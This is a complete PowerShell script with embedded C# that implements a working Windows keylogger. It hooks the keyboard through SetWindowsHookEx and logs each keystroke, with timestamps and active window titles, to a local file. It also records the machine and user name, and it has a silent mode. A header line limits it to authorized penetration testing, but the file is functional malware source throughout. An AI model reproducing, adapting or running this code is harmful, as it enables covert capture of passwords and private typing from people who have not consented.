# Windows Keylogger - Native PowerShell
# No Python Required - For authorized penetration testing only

param(
    [string]$OutputFile = ".\keylog.txt",
    [int]$Duration = 300,  # Duration in seconds (default 5 minutes)
    [switch]$Silent
)

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[*] $Message"
    }
}

Write-Log "Windows PowerShell Keylogger"
Write-Log "Output: $OutputFile"
Write-Log "Duration: $Duration seconds"
Write-Log "Press Ctrl+C to stop early"
Write-Log "="*50

# C# code for keyboard hook
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Windows.Forms;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string outputFile;
    private static DateTime startTime;
    private static int duration;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            
            // Check if duration expired
            if ((DateTime.Now - startTime).TotalSeconds > duration) {
                Application.Exit();
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            
            string key = GetKeyName(vkCode);
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string activeWindow = GetActiveWindowTitle();
            
            string logEntry = string.Format("[{0}] [{1}] {2}\n", timestamp, activeWindow, key);
            File.AppendAllText(outputFile, logEntry);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    
    private static string GetActiveWindowTitle() {
        const int nChars = 256;
        StringBuilder buffer = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();
        
        if (GetWindowText(handle, buffer, nChars) > 0) {
            return buffer.ToString();
        }
        return "Unknown";
    }
    
    private static string GetKeyName(int vkCode) {
        // Handle special keys
        switch (vkCode) {
            case 0x08: return "[BACKSPACE]";
            case 0x09: return "[TAB]";
            case 0x0D: return "[ENTER]";
            case 0x10: return "[SHIFT]";
            case 0x11: return "[CTRL]";
            case 0x12: return "[ALT]";
            case 0x1B: return "[ESC]";
            case 0x20: return " ";
            case 0x2E: return "[DELETE]";
            case 0x25: return "[LEFT]";
            case 0x26: return "[UP]";
            case 0x27: return "[RIGHT]";
            case 0x28: return "[DOWN]";
            default:
                // Check if Shift is pressed
                bool shiftPressed = (GetAsyncKeyState(0x10) & 0x8000) != 0;
                bool capsLock = (GetAsyncKeyState(0x14) & 0x0001) != 0;
                
                // Convert virtual key code to character
                if (vkCode >= 0x41 && vkCode <= 0x5A) { // A-Z
                    char c = (char)vkCode;
                    if (!shiftPressed && !capsLock || (shiftPressed && capsLock)) {
                        c = char.ToLower(c);
                    }
                    return c.ToString();
                }
                else if (vkCode >= 0x30 && vkCode <= 0x39) { // 0-9
                    if (shiftPressed) {
                        string[] shiftNumbers = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                        return shiftNumbers[vkCode - 0x30];
                    }
                    return ((char)vkCode).ToString();
                }
                else if (vkCode >= 0x60 && vkCode <= 0x69) { // Numpad 0-9
                    return (vkCode - 0x60).ToString();
                }
                
                return string.Format("[KEY:{0}]", vkCode);
        }
    }

    public static void Start(string file, int durationSeconds) {
        outputFile = file;
        duration = durationSeconds;
        startTime = DateTime.Now;
        
        // Write header
        File.AppendAllText(outputFile, string.Format("\n=== Keylogger Session Started: {0} ===\n", startTime.ToString()));
        File.AppendAllText(outputFile, string.Format("Computer: {0}\nUser: {1}\n\n", Environment.MachineName, Environment.UserName));
        
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
        
        // Write footer
        File.AppendAllText(outputFile, string.Format("\n=== Session Ended: {0} ===\n", DateTime.Now.ToString()));
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
}
"@

try {
    Write-Log "Compiling keylogger..."
    
    Add-Type -TypeDefinition $code -ReferencedAssemblies @(
        "System.Windows.Forms",
        "System.Drawing"
    ) -ErrorAction Stop
    
    Write-Log "Starting keylogger..."
    Write-Log "Logging keys for $Duration seconds..."
    
    # Start the keylogger
    [KeyLogger]::Start($OutputFile, $Duration)
    
    Write-Log "Keylogger stopped."
    Write-Log "Log saved to: $OutputFile"
    
    # Display summary
    if (-not $Silent -and (Test-Path $OutputFile)) {
        $lineCount = (Get-Content $OutputFile | Measure-Object -Line).Lines
        Write-Host "`n[+] Captured $lineCount lines" -ForegroundColor Green
        Write-Host "[*] Last 10 entries:" -ForegroundColor Cyan
        Get-Content $OutputFile | Select-Object -Last 10
    }
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
    Write-Host "[!] Make sure you're running PowerShell with appropriate permissions" -ForegroundColor Yellow
}
